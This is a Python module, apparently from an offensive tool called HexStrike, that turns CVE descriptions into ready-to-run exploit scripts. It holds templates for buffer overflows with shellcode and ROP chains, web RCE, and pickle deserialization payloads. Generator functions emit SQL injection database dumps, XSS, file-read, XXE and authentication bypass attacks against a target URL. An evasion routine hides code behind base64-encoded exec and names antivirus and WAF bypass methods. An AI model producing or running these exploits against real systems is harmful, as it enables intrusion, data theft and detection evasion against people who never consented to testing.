"""
AI Exploit Generator
Extracted from HexStrike exploit generation system

This module provides AI-powered exploit development and enhancement capabilities.
It analyzes CVE data and generates working exploits using the exploit classes.
"""

import base64
import logging
import re
from typing import Dict, Any, Tuple

# Import exploit classes
from .exploits import (
    SQLiExploit,
    XSSExploit,
    FileReadExploit,
    RCEExploit,
    XXEExploit,
    DeserializationExploit,
    AuthBypassExploit,
    BufferOverflowExploit,
    GenericExploit
)

logger = logging.getLogger(__name__)


class AIExploitGenerator:
    """AI-powered exploit development and enhancement system"""

    def __init__(self):
        # Exploit templates for code generation
        self.exploit_templates = {
            "buffer_overflow": {
                "x86": """
# Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x86

import struct
import socket

def create_exploit():
    # Vulnerability details from {cve_id}
    target_ip = "{target_ip}"
    target_port = {target_port}

    # Buffer overflow payload
    padding = "A" * {offset}
    eip_control = struct.pack("<I", {ret_address})
    nop_sled = "\\x90" * {nop_size}

    # Shellcode ({shellcode_type})
    shellcode = {shellcode}

    exploit = padding + eip_control + nop_sled + shellcode
    return exploit

if __name__ == "__main__":
    payload = create_exploit()
    print(f"Exploit payload generated for {cve_id}")
    print(f"Payload size: {{len(payload)}} bytes")
                """,
                "x64": """
# 64-bit Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x64

import struct
import socket

def create_rop_exploit():
    target_ip = "{target_ip}"
    target_port = {target_port}

    # ROP chain for x64 exploitation
    padding = "A" * {offset}
    rop_chain = [
        {rop_gadgets}
    ]

    rop_payload = "".join([struct.pack("<Q", addr) for addr in rop_chain])
    shellcode = {shellcode}

    exploit = padding + rop_payload + shellcode
    return exploit
                """
            },
            "web_rce": """
# Web-based RCE Exploit for {cve_id}
# Target: {target_info}

import requests
import sys

def exploit_rce(target_url, command):
    # CVE {cve_id} exploitation
    headers = {{
        "User-Agent": "Mozilla/5.0 (Compatible Exploit)",
        "Content-Type": "{content_type}"
    }}

    # Injection payload
    payload = {injection_payload}

    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(f"Exploit failed: {{e}}")

    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target_url> <command>")
        sys.exit(1)

    result = exploit_rce(sys.argv[1], sys.argv[2])
    if result:
        print("Exploit successful!")
        print(result)
            """,
            "deserialization": """
# Deserialization Exploit for {cve_id}
# Target: {target_info}

import pickle
import base64
import requests

class ExploitPayload:
    def __reduce__(self):
        return (eval, ('{command}',))

def create_malicious_payload(command):
    payload = ExploitPayload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()
    return encoded

def send_exploit(target_url, command):
    payload = create_malicious_payload(command)

    data = {{
        "{parameter_name}": payload
    }}

    response = requests.post(target_url, data=data)
    return response.text
            """
        }

        self.evasion_techniques = {
            "encoding": ["url", "base64", "hex", "unicode"],
            "obfuscation": ["variable_renaming", "string_splitting", "comment_injection"],
            "av_evasion": ["encryption", "packing", "metamorphism"],
            "waf_bypass": ["case_variation", "parameter_pollution", "header_manipulation"]
        }

    def generate_exploit_from_cve(self, cve_data: Dict[str, Any], target_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate working exploit from real CVE data with specific implementation

        Args:
            cve_data: CVE information dictionary
            target_info: Target configuration dictionary

        Returns:
            Dictionary containing exploit generation results
        """
        try:
            cve_id = cve_data.get("cve_id", "")
            description = cve_data.get("description", "").lower()

            logger.info(f"Generating specific exploit for {cve_id}")

            # Enhanced vulnerability classification using real CVE data
            vuln_type, specific_details = self._analyze_vulnerability_details(description, cve_data)

            # Generate real, specific exploit based on CVE details
            if vuln_type == "sql_injection":
                exploit_code = self._generate_sql_injection_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "xss":
                exploit_code = self._generate_xss_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "rce" or vuln_type == "web_rce":
                exploit_code = self._generate_rce_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "xxe":
                exploit_code = self._generate_xxe_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "deserialization":
                exploit_code = self._generate_deserialization_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "file_read" or vuln_type == "directory_traversal":
                exploit_code = self._generate_file_read_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "authentication_bypass":
                exploit_code = self._generate_auth_bypass_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "buffer_overflow":
                exploit_code = self._generate_buffer_overflow_exploit(cve_data, target_info, specific_details)
            else:
                # Fallback to intelligent generic exploit
                exploit_code = self._generate_intelligent_generic_exploit(cve_data, target_info, specific_details)

            # Apply evasion techniques if requested
            if target_info.get("evasion_level", "none") != "none":
                exploit_code = self._apply_evasion_techniques(exploit_code, target_info)

            # Generate specific usage instructions
            instructions = self._generate_specific_instructions(vuln_type, cve_data, target_info, specific_details)

            return {
                "success": True,
                "cve_id": cve_id,
                "vulnerability_type": vuln_type,
                "specific_details": specific_details,
                "exploit_code": exploit_code,
                "instructions": instructions,
                "evasion_applied": target_info.get("evasion_level", "none"),
                "implementation_type": "real_cve_based"
            }

        except Exception as e:
            logger.error(f"Error generating exploit for {cve_data.get('cve_id', 'unknown')}: {str(e)}")
            return {"success": False, "error": str(e)}

    def _analyze_vulnerability_details(self, description: str, cve_data: Dict[str, Any]) -> Tuple[str, Dict[str, Any]]:
        """
        Analyze CVE data to extract specific vulnerability details

        Args:
            description: CVE description text
            cve_data: Full CVE data dictionary

        Returns:
            Tuple of (vulnerability_type, specific_details)
        """
        vuln_type = "generic"
        specific_details = {
            "endpoints": [],
            "parameters": [],
            "payload_location": "unknown",
            "software": "unknown",
            "version": "unknown",
            "attack_vector": "unknown"
        }

        # Extract specific details from description
        description_lower = description.lower()

        # SQL Injection detection and details
        if any(keyword in description_lower for keyword in ["sql injection", "sqli"]):
            vuln_type = "sql_injection"
            # Extract endpoint from description
            endpoint_match = re.search(r'(/[^\s]+\.php[^\s]*)', description)
            if endpoint_match:
                specific_details["endpoints"] = [endpoint_match.group(1)]
            # Extract parameter names
            param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
            if param_matches:
                specific_details["parameters"] = param_matches

        # XSS detection
        elif any(keyword in description_lower for keyword in ["cross-site scripting", "xss"]):
            vuln_type = "xss"
            # Extract XSS context
            if "stored" in description_lower:
                specific_details["xss_type"] = "stored"
            elif "reflected" in description_lower:
                specific_details["xss_type"] = "reflected"
            else:
                specific_details["xss_type"] = "unknown"

        # XXE detection
        elif any(keyword in description_lower for keyword in ["xxe", "xml external entity"]):
            vuln_type = "xxe"
            specific_details["payload_location"] = "xml"

        # File read/traversal detection
        elif any(keyword in description_lower for keyword in ["file read", "directory traversal", "path traversal", "arbitrary file", "file disclosure", "local file inclusion", "lfi", "file inclusion"]):
            vuln_type = "file_read"
            if "directory traversal" in description_lower or "path traversal" in description_lower:
                specific_details["traversal_type"] = "directory"
            elif "local file inclusion" in description_lower or "lfi" in description_lower:
                specific_details["traversal_type"] = "lfi"
            else:
                specific_details["traversal_type"] = "file_read"

            # Extract parameter names for LFI
            param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
            if param_matches:
                specific_details["parameters"] = param_matches

        # Authentication bypass
        elif any(keyword in description_lower for keyword in ["authentication bypass", "auth bypass", "login bypass"]):
            vuln_type = "authentication_bypass"

        # RCE detection
        elif any(keyword in description_lower for keyword in ["remote code execution", "rce", "command injection"]):
            vuln_type = "rce"

        # Deserialization
        elif any(keyword in description_lower for keyword in ["deserialization", "unserialize", "pickle"]):
            vuln_type = "deserialization"

        # Buffer overflow
        elif any(keyword in description_lower for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
            vuln_type = "buffer_overflow"

        # Extract software and version info
        software_match = re.search(r'(\w+(?:\s+\w+)*)\s+v?(\d+(?:\.\d+)*)', description)
        if software_match:
            specific_details["software"] = software_match.group(1)
            specific_details["version"] = software_match.group(2)

        return vuln_type, specific_details

    def _apply_evasion_techniques(self, exploit_code: str, target_info: Dict[str, Any]) -> str:
        """Apply evasion techniques to exploit code"""
        evasion_level = target_info.get("evasion_level", "basic")

        if evasion_level == "basic":
            # Simple string obfuscation
            exploit_code = exploit_code.replace('"', "'")
            exploit_code = f"# Obfuscated exploit\n{exploit_code}"
        elif evasion_level == "advanced":
            # Advanced obfuscation
            exploit_code = self._advanced_obfuscation(exploit_code)

        return exploit_code

    def _advanced_obfuscation(self, code: str) -> str:
        """Apply advanced obfuscation techniques"""
        obfuscated = f"""
# Advanced evasion techniques applied
import base64
exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
        """
        return obfuscated

    # Methods that generate exploit code as strings (keeping original template-based approach for compatibility)
    # These can be refactored to use the actual exploit classes if needed

    def _generate_sql_injection_exploit(self, cve_data, target_info, details):
        """Generate SQL injection exploit code"""
        # Returns generated Python code as string (original template approach)
        # Could be refactored to instantiate and use SQLiExploit class
        from .exploits.sqli import SQLiExploit
        cve_id = cve_data.get("cve_id", "")
        endpoint = details.get("endpoints", ["/vulnerable.php"])[0] if details.get("endpoints") else "/vulnerable.php"
        parameter = details.get("parameters", ["id"])[0] if details.get("parameters") else "id"

        # Return exploit code template
        return f'''#!/usr/bin/env python3
# SQL Injection Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...
# Target: {details.get("software", "Unknown")} {details.get("version", "")}

from agents.cve.exploits.sqli import SQLiExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = SQLiExploit(target_url, endpoint="{endpoint}", parameter="{parameter}")

    print(f"[+] SQL Injection Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if exploit.test_injection():
        print("[+] Target appears vulnerable!")
        exploit.extract_database_info()
        exploit.dump_tables()
    else:
        print("[-] Target does not appear vulnerable")
'''

    def _generate_xss_exploit(self, cve_data, target_info, details):
        """Generate XSS exploit code"""
        cve_id = cve_data.get("cve_id", "")
        xss_type = details.get("xss_type", "reflected")

        return f'''#!/usr/bin/env python3
# Cross-Site Scripting (XSS) Exploit for {cve_id}
# Type: {xss_type.title()} XSS
# Vulnerability: {cve_data.get("description", "")[:100]}...

from agents.cve.exploits.xss import XSSExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url> [parameter]")
        sys.exit(1)

    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "q"

    exploit = XSSExploit(target_url)

    print(f"[+] XSS Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if exploit.test_reflected_xss(parameter, "{cve_id}"):
        print("[+] Reflected XSS vulnerability confirmed!")
    if exploit.test_stored_xss(cve_id="{cve_id}"):
        print("[+] Stored XSS vulnerability confirmed!")
'''

    def _generate_file_read_exploit(self, cve_data, target_info, details):
        """Generate file read/LFI exploit code"""
        cve_id = cve_data.get("cve_id", "")
        parameter = details.get("parameters", ["file"])[0] if details.get("parameters") else "file"

        return f'''#!/usr/bin/env python3
# Local File Inclusion (LFI) Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...
# Parameter: {parameter}

from agents.cve.exploits.file_read import FileReadExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url> [file_to_read]")
        sys.exit(1)

    target_url = sys.argv[1]
    specific_file = sys.argv[2] if len(sys.argv) > 2 else None

    exploit = FileReadExploit(target_url)

    print(f"[+] File Read Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if specific_file:
        exploit.read_specific_file(specific_file, "{parameter}")
    else:
        if exploit.test_file_read("{parameter}"):
            print("[+] File read vulnerability confirmed!")
'''

    def _generate_rce_exploit(self, cve_data, target_info, details):
        """Generate RCE exploit code"""
        cve_id = cve_data.get("cve_id", "")

        return f'''#!/usr/bin/env python3
# Remote Code Execution Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

from agents.cve.exploits.rce import RCEExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url> [command]")
        sys.exit(1)

    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"

    exploit = RCEExploit(target_url)

    print(f"[+] RCE Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if exploit.test_rce(command):
        print("[+] RCE vulnerability confirmed!")
'''

    def _generate_xxe_exploit(self, cve_data, target_info, details):
        """Generate XXE exploit code"""
        cve_id = cve_data.get("cve_id", "")

        return f'''#!/usr/bin/env python3
# XXE (XML External Entity) Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

from agents.cve.exploits.xxe import XXEExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = XXEExploit(target_url)

    print(f"[+] XXE Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if exploit.test_xxe():
        print("[+] XXE vulnerability confirmed!")
'''

    def _generate_deserialization_exploit(self, cve_data, target_info, details):
        """Generate deserialization exploit code"""
        cve_id = cve_data.get("cve_id", "")

        return f'''#!/usr/bin/env python3
# Deserialization Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

from agents.cve.exploits.deserial import DeserializationExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = DeserializationExploit(target_url)

    print(f"[+] Deserialization Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if exploit.test_deserialization():
        print("[+] Deserialization vulnerability confirmed!")
'''

    def _generate_auth_bypass_exploit(self, cve_data, target_info, details):
        """Generate authentication bypass exploit code"""
        cve_id = cve_data.get("cve_id", "")

        return f'''#!/usr/bin/env python3
# Authentication Bypass Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

from agents.cve.exploits.auth_bypass import AuthBypassExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = AuthBypassExploit(target_url)

    print(f"[+] Authentication Bypass Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if exploit.test_sql_auth_bypass() or exploit.test_header_bypass():
        print("[+] Authentication bypass confirmed!")
'''

    def _generate_buffer_overflow_exploit(self, cve_data, target_info, details):
        """Generate buffer overflow exploit code"""
        cve_id = cve_data.get("cve_id", "")
        arch = target_info.get("target_arch", "x64")

        return f'''#!/usr/bin/env python3
# Buffer Overflow Exploit for {cve_id}
# Architecture: {arch}
# Vulnerability: {cve_data.get("description", "")[:100]}...

from agents.cve.exploits.buffer_overflow import BufferOverflowExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target_host> <target_port>")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = sys.argv[2]

    exploit = BufferOverflowExploit(target_host, target_port, "{arch}")

    print(f"[+] Buffer Overflow Exploit for {cve_id}")
    print(f"[+] Target: {{target_host}}:{{target_port}}")

    payload = exploit.create_exploit()
    exploit.send_exploit(payload)
'''

    def _generate_intelligent_generic_exploit(self, cve_data, target_info, details):
        """Generate generic exploit code"""
        cve_id = cve_data.get("cve_id", "")

        return f'''#!/usr/bin/env python3
# Generic Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:150]}...

from agents.cve.exploits.generic import GenericExploit

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = GenericExploit(target_url, "{cve_id}")

    print(f"[+] Generic Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")

    if exploit.analyze_target():
        exploit.test_vulnerability()
        exploit.exploit()
'''

    def _generate_specific_instructions(self, vuln_type: str, cve_data: Dict[str, Any],
                                       target_info: Dict[str, Any], details: Dict[str, Any]) -> str:
        """Generate specific usage instructions based on vulnerability type"""
        cve_id = cve_data.get("cve_id", "")

        base_instructions = f"""# Exploit for {cve_id}
# Vulnerability Type: {vuln_type}
# Software: {details.get('software', 'Unknown')} {details.get('version', '')}

## Vulnerability Details:
{cve_data.get('description', 'No description available')[:300]}...

## Usage Instructions:
1. Ensure target is running vulnerable software version
2. Test in authorized environment only
3. Adjust parameters based on target configuration
4. Monitor for defensive responses

## Basic Usage:
python3 exploit.py <target_url>"""

        if vuln_type == "sql_injection":
            return base_instructions + f"""

## SQL Injection Specific:
- Parameter: {details.get('parameters', ['unknown'])[0]}
- Endpoint: {details.get('endpoints', ['unknown'])[0]}
- Test with: python3 exploit.py http://target.com
- The script will automatically test for time-based blind SQL injection
- If successful, it will attempt to extract database information"""

        elif vuln_type == "xss":
            return base_instructions + f"""

## XSS Specific:
- Type: {details.get('xss_type', 'unknown')}
- Test with: python3 exploit.py http://target.com parameter_name
- The script tests both reflected and stored XSS
- Payloads include basic and advanced bypass techniques"""

        elif vuln_type == "file_read":
            return base_instructions + f"""

## File Read/Directory Traversal:
- Test with: python3 exploit.py http://target.com file_parameter
- Automatically tests common files (/etc/passwd, etc.)
- Includes encoding and bypass techniques"""

        return base_instructions + f"""

## General Testing:
- Run: python3 exploit.py <target_url>
- Check target software version matches vulnerable range
- Monitor application logs for exploitation attempts
- Verify patch status before testing"""
